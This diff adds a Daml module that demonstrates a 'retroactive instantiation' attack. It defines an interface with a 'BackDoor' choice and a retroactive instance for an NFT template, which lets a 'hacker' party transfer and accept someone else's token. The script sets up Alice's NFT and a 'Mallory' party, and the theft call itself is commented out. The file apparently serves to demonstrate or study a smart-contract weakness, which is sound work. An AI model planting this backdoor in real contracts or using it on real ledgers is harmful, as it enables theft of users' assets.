@@ -1,0 +1,45 @@
+---------------------------------------------
+---- Attack 1: Retroactive instantiation ----
+---------------------------------------------
+
+{-# LANGUAGE ApplicativeDo #-}
+
+module G_AssetBackDoor where
+
+import qualified A_Asset as Asset
+import qualified B_BandNFT as NFT
+
+import Daml.Script
+
+data EmptyView = EmptyView {}
+
+interface NFTBackDoor requires Asset.Asset where
+  viewtype EmptyView
+
+  nonconsuming choice BackDoor : ContractId NFT.NFT
+    with
+      hacker: Party
+    controller hacker
+    do
+      proposal <- exercise (Asset.toId self) (Asset.Transfer hacker)
+      cid <- exercise proposal Asset.Accept
+      pure $ fromInterfaceContractId cid
+
+  -- Malicious retroactive intance !
+  interface instance NFTBackDoor for NFT.NFT where
+    view = EmptyView
+
+main : Script ()
+main = script do
+  band <- allocateParty "Iron Furry"
+  public <- allocateParty "Public"
+  alice <- allocateParty "Alice"
+  mallory <- allocateParty "Mallory"
+
+  alicesNft <- submitMulti [band, alice] [] do
+    createCmd (NFT.NFT band "Metal Storm" alice public)
+
+  -- cid <- submitMulti [mallory] [public] do
+  --     exerciseCmd (toInterfaceContractId @NFTBackDoor alicesNft) (BackDoor mallory)
+
+  pure ()
